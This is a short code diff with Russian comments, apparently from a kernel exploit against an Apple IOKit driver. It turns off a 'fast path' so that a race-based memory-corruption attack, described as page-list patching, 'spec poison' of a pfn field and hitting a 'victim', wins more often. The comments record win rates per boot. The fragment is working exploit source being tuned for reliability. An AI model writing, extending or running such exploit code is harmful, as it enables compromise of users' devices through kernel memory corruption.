@@ -6760,7 +6760,10 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     uint64_t rmdHitArr = 0, rmdHitOld = 0; uint32_t rmdHitOff = 0;
     uint64_t specVA[8] = {0}, specOld[8] = {0}; int nSpec = 0;
     int changed = 0;
-    if (nDep) goto kpx_submit1;
+    // 1.9.270: fast-path ОТКАТЁН — данные по бутам: медленный путь ~75% побед,
+    // fast-path 0/6. Середина (фазы VAD/PAR/OWN/RMD/SPC) даёт ~60с дозревания
+    // record buffer до victim#1 — без него сериализатор читает незрелое/оригинал.
+    // if (nDep) goto kpx_submit1;   // ВЫКЛЮЧЕНО
 
     // 1.9.244: РАННИЙ ПАТЧ — page-0 записи page-list из SCAN A (найдены до любого
     // submit, до 9+ секунд DEP-скана = вне окна мины). zone-VA по значению хита
@@ -7386,7 +7389,8 @@ kpx_submit1: ;
         } else {
             kpNote(r, [NSString stringWithFormat:@"  [OPD] op-entry не найден (UC=%#llx prov=%#llx)", (unsigned long long)ucO, (unsigned long long)provO]);
         }
-        goto kpx_retry;
+        // 1.9.270: goto kpx_retry УБРАН — fast-path регрессия (0/6 против ~75%
+        // медленного): середина с дозреванием record buffer нужна для победы.
     }
     // 1.9.222: SPEC-яд — голый pfn32 по +0x58 = ranges-spec rewriter'а (р.52/55:
     // ldr w8,[x22,#0x58] → desc+0x9c). ПРЯМОЙ ПУТЬ (р.55): spec = [planeDesc+0x60],
